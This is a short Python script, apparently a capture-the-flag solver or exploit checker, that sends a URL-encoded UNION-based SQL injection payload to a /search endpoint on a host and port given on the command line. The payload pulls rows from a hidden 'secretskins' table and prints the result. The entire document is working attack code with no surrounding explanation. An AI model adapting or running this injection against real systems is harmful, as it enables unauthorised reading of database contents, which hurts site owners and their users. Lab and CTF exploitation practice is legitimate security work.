import requests
import sys

proto = "https" if sys.argv[1].endswith(".dev") else "http"
host = sys.argv[1]
port = int(sys.argv[2])

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = 'query=%27+UNION+SELECT+skinid%2C+null%2C+null%2C+description%2C+image+FROM+secretskins+WHERE+skinid+%3D+%27gems%27+%2F*'

response = requests.post(f'{proto}://{host}:{port}/search', headers=headers, data=data)
print(response.text)
